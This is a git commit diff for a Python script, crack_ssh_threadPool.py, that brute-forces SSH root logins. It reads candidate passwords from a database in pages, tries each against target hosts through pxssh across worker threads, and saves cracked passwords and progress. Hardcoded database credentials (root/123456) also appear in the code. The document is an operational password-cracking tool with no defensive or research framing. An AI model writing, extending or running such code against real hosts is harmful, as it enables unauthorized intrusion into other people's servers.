70f9c4bd4a321dda689a0d21c5510010d835fe70
zzzzzga <1311949161@qq.com>
2017-12-23 18:01:48 +0800

    修改策略

--- crack_ssh_threadPool.py
+++ crack_ssh_threadPool.py
@@ -6,8 +6,7 @@
 from pexpect import pxssh
 from threading import *
 from databaseHelper import DatabaseHelper
-
-PASSWORDFILE = 'password.txt'
+import time
 
 class CrackSSHWorkInfo:
   def __init__(self, id, host, password, user='root'):
@@ -15,50 +14,52 @@ class CrackSSHWorkInfo:
     self._password = password
     self._host = host
     self._id = id
+    self.pageSize = 100
+    self.pageIndex = 1
+    self.skipSave = 11
     self.dbHelper = DatabaseHelper('192.168.1.102', 'crack_ssh', 'root', '123456')
     
   def _checkPassword(self, password):
     try:
       s = pxssh.pxssh()
       s.login(self._host, self._user, password)
-    except Exception as e:
-      print('[-] Login Fail..., ErrorInfo: {0}'.format(e))
-      return False
-    finally:
       s.logout()
+    except Exception as e:
+      # print('[-] password: {1} Login Fail..., ErrorInfo: {0}'.format(e, password))
+      return False
     return True
 
   def _saveWorkInfo(self, password, crackState):
-    self.dbHelper.nonQuery('update crackResult set password = %s, crackState = %s where id = %s', (password, ENDCRACK, self._id))
+    self.dbHelper.nonQuery('update crackResult set password = %s, crackState = %s where id = %s', (password, crackState, self._id))
 
   def workThread(self, lock):
     try:
+      tryCount = 0
+      totalTime = 0
       if self._password == None:
-        reslut = self.dbHelper.queryOne('select val from password order by val')
+        results = self.dbHelper.pageQuery('select val from password order by val', pageIndex = 1, pageSize = self.pageSize)
       else:
-        reslut = self.dbHelper.queryOne('select val from password where val > %s order by val', (self._password,))
+        results = self.dbHelper.pageQuery('select val from password where val > %s order by val', (self._password,), self.pageSize, self.pageSize)
 
-      while (reslut != None):
-        if self._checkPassword(reslut['val']):
-          self._saveWorkInfo(reslut, OKCRACK)
-          break
-        else:
-          self._saveWorkInfo(reslut, CRACKING)
-        reslut = self.dbHelper.queryOne('select val from password where val > %s order by val', (reslut,))
+      while (len(results) > 0):
+        start1 = time.time()
+        for result in results:
+          tryCount += 1
+          start = time.time()
+          if self._checkPassword(result['val']):
+            self._saveWorkInfo(result['val'], OKCRACK)
+            return
+          else:
+            tryCount %= self.skipSave
+            if (tryCount == 0):
+              self._saveWorkInfo(result['val'], CRACKING)
+          totalTime += time.time() - start
+        self.pageSize += 1
+        results = self.dbHelper.pageQuery('select val from password where val > %s order by val', (self._password,), self.pageSize, self.pageSize)
+        print('%f, %f' %(time.time() - start1, totalTime))
+
       else:
-        self._saveWorkInfo(reslut, ENDCRACK)
-      
-    except Exception as e:
-      print(str(e))
-    try:
-      with open(PASSWORDFILE, 'r') as f:
-        for line in f:
-          line = line.strip('\n').strip()
-          if self._checkPassword(line):
-            self._saveWorkInfo(line)
-            break
-        else:
-          self.dbHelper.nonQuery('update crackResult set crackState = %s where id = %s', (ENDCRACK, self._id))
+        self._saveWorkInfo('', ENDCRACK)
     except Exception as e:
       print(str(e))
     
@@ -80,9 +81,10 @@ class CrackSSHThreadPool:
 class SSHScheduler:
   def __init__(self):
     self.dbHelper = DatabaseHelper('192.168.1.102', 'crack_ssh', 'root', '123456')
+    self.dbHelper.nonQuery('update crackResult set crackState = %s where crackState = %s', (NOSTART,CRACKING))
   
   def getNextWork(self):
-    dictResult = self.dbHelper.queryOne('select id, host, password from crackResult where state = %s and password is null and (crackState = %s or crackState = %s) order by id asc', ('open', NOSTART, CRACKING))
+    dictResult = self.dbHelper.queryOne('select id, host, password from crackResult where state = %s and crackState = %s order by id asc', ('open', NOSTART))
     if dictResult == None:
       return None
     self.dbHelper.nonQuery('update crackResult set crackState = %s where id = %s', (CRACKING, dictResult['id']))
